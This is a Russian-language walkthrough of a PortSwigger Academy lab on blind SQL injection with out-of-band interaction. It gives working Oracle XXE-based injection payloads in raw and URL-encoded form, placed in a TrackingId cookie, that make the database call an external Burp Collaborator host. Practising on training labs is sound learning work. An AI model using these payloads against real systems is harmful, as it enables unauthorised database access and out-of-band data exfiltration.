Перейдем на корневую страницу и найдем запрос содержащий `Cookie`. Найдем данный запрос в `Proxy` -> `HTTP history` и отправим его в `Repeater` 
```
GET / 
Cookie: TrackingId=4SgbEzlQsHf6v9lR;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/12.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/pics%20for%20walktrough/1.png)
По заданию нам необходимо сделать DNS запрос на DGA-домен бурпа со стороны базы данных
Перейдем в раздел `Collaborator` и сгенерируем наш DGA-домен
```
0klkfvp6f9v8uctwnzajzbcnue05ovck.oastify.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/12.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/pics%20for%20walktrough/2.png)
Воспользуемся читлистом для решения лабораторных работ по SQL инъекциям
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
Тут нам необходим следующий пэйлоад
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```
На прошлом этапе мы создали страницу с DGA-доменом - `0klkfvp6f9v8uctwnzajzbcnue05ovck.oastify.com` подставим ее в запрос
```
Cookie: TrackingId=4SgbEzlQsHf6v9lR' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://0klkfvp6f9v8uctwnzajzbcnue05ovck.oastify.com/"> %remote;]>'),'/l') FROM dual)--; 
```
Или же в URL-кодировке выгдядит как
```
Cookie: TrackingId=4SgbEzlQsHf6v9lR' || (SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//0klkfvp6f9v8uctwnzajzbcnue05ovck.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--; 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/12.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/pics%20for%20walktrough/3.png)
Вернемся в раздел `Collaborator` и видим, что на него действительно пришел DNS запрос от уязвимого ресурса
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/12.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/pics%20for%20walktrough/4.png)
Обновим главную страницу и увидим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/12.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction/pics%20for%20walktrough/5.png)
